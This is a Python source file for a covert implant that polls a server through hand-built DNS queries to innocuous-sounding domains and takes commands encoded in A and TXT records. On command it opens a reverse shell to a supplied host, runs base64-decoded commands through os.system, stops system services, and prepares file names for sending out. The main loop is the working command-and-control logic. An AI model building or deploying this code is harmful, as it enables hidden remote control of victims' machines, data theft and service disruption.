#!/usr/bin/env python3
global SERVER; SERVER = ''
import socket
import struct
import time
import os
import base64
import subprocess
import threading

WAIT_TIME = 10

def startReverseShell(HOST, PORT):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, int(PORT)))
        while True:
            cmd = s.recv(1024).decode().strip()
            if not cmd or cmd.lower() == "exit":
                break
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            if len(output) == 0:
                output = b' ' #avoid sending empty response which can cause client to hang
            s.send(output)

def makeQuery(address, recordType='A'): #Default to A record, can specify TXT for TXT record queries
    query = b'\x12\x34'  # Transaction ID
    query += b'\x01\x00'  # Flags
    query += b'\x00\x01'  # QDCOUNT
    query += b'\x00\x00'  # ANCOUNT
    query += b'\x00\x00'  # NSCOUNT
    query += b'\x00\x00'  # ARCOUNT
    for part in address.split('.'):
        query += bytes([len(part)]) + part.encode()
    query += b'\x00'
    # Set QTYPE based on recordType parameter
    if recordType.upper() == 'TXT':
        query += b'\x00\x10'  # QTYPE 16 for TXT record
    else:
        query += b'\x00\x01'  # QTYPE 1 for A record (default)
    query += b'\x00\x01'  # QCLASS (IN)
    return query

def getResponse(data, recordType='ANY'):
    answers = []
    try:
        header = data[:12]
        qdcount = struct.unpack("!H", header[4:6])[0]
        ancount = struct.unpack("!H", header[6:8])[0]
        offset = 12

        # Skip question section
        for _ in range(qdcount):
            while data[offset] != 0:
                offset += data[offset] + 1
            offset += 5  # 0 + QTYPE(2) + QCLASS(2)

        # Answer section
        for _ in range(ancount):
            if offset + 12 > len(data):
                break

            rtype = struct.unpack("!H", data[offset+2:offset+4])[0]
            rdlength = struct.unpack("!H", data[offset+10:offset+12])[0]
            offset += 12

            rdata = data[offset:offset+rdlength]

            if rtype == 16:  # TXT
                txtData = b""
                rdOffset = 0
                while rdOffset < rdlength:
                    if rdOffset + 1 > rdlength:
                        break
                    length = rdata[rdOffset]
                    rdOffset += 1
                    if rdOffset + length > rdlength:
                        break
                    txtData += rdata[rdOffset:rdOffset+length]
                    rdOffset += length

                if recordType.upper() == 'TXT' or recordType.upper() == 'ANY':
                    answers.append(txtData.decode('utf-8', errors='ignore'))

            elif rtype == 1 and rdlength == 4:  # A
                if recordType.upper() == 'A' or recordType.upper() == 'ANY':
                    ip = ".".join(str(b) for b in rdata[:4])
                    answers.append(ip)

            offset += rdlength

    except Exception as e:
        print("Parsing error:", e)

    return answers

def from_base64(b64: str) -> str:
    return base64.b64decode(b64.encode("ascii")).decode("ascii")

def formSocket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    return sock
    
def resolveFileName(ips):
    characters = []
    fileName = ""
    for ip in ips:
        ipSplit = ip.split('.')
        for entry in ipSplit:
            characters.append(entry)
    for character in characters:
        if character == "3":
            break
        fileName = fileName + chr(int(character))
        
    return fileName
    
def spawnRevShell(host, port):
    thread = threading.Thread(target=startReverseShell, args=(host, port))
    thread.start()

sock = formSocket()
sock.sendto(makeQuery("supportcenter.net"), (SERVER, 53))
try:
    resp, _ = sock.recvfrom(512)
except socket.timeout:
    pass

time.sleep(WAIT_TIME)

while True:
    timeout = False
    sock.sendto(makeQuery("freegames.net"), (SERVER, 53))
    try:
        resp, _ = sock.recvfrom(512)
    except socket.timeout:
        timeout = True
        pass
    if not timeout:
        ips = getResponse(resp)
        print("Resolved IPs:", ips)
        
        if(len(ips) == 1):
            ipSplit = ips[0].split('.')
            if(ipSplit[3] == "232"): #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
                print("Reverse Shell command recieved")
                sock.sendto(makeQuery("securelogin.com"), (SERVER, 53))
                resp, _ = sock.recvfrom(512)

                ips = getResponse(resp)
                
                address = ips[0]
                portIP = ips[1]
                
                portIPSplit = portIP.split('.')
                port = int(portIPSplit[0]) + int(portIPSplit[1])
                
                if not ((address == "100.100.100.100") and (port == 100)):
                    print("Sending shell to " + address + ":" + str(port)) 
                    spawnRevShell(address, str(port))
            elif(ipSplit[3] == "85"): 
                print("Collecting file contents")
                
                sock.sendto(makeQuery("fileshare.org"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
                resp, _ = sock.recvfrom(512)

                ips = getResponse(resp)
                
                if not ((len(ips) == 1) and ((ips[0].split('.'))[3] == "100")):
                    fileName = resolveFileName(ips)
                    
                print("Accessing file: " + fileName)
                
                sock.sendto(makeQuery("cloudlogin.com"), (SERVER, 53)) #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
                resp, _ = sock.recvfrom(512)
                
                ips = getResponse(resp)
                
                address = ips[0]
                portIP = ips[1]
                
                portIPSplit = portIP.split('.')
                port = int(portIPSplit[0]) + int(portIPSplit[1])
                
                if not ((address == "100.100.100.100") and (port == 100)):
                    print("Sending file contents to " + address + ":" + str(port)) 
            elif(ipSplit[3] == "150"):
                print("Collecting service name")
                
                sock.sendto(makeQuery("cloudvault.org"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
                resp, _ = sock.recvfrom(512)

                ips = getResponse(resp)
                
                if not ((len(ips) == 1) and ((ips[0].split('.'))[3] == "100")):
                    serviceName = resolveFileName(ips)
                    
                print("Stopping service: " + serviceName)
                os.system("systemctl stop " + serviceName)
            elif(ipSplit[1] == "65"):
                print("Collecting command to run")
                
                sock.sendto(makeQuery("remotehelp.com"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
                resp, _ = sock.recvfrom(512)

                data = getResponse(resp)
                
                if len(data) == 1 and len(data[0].split('.')) == 4:
                    if data[0].split('.')[3] == "100":
                        continue #Error response, skip running command
                else:
                    command = from_base64(data[0])
                    
                #print("Running command: " + command)
                os.system(command)
                
    time.sleep(WAIT_TIME)
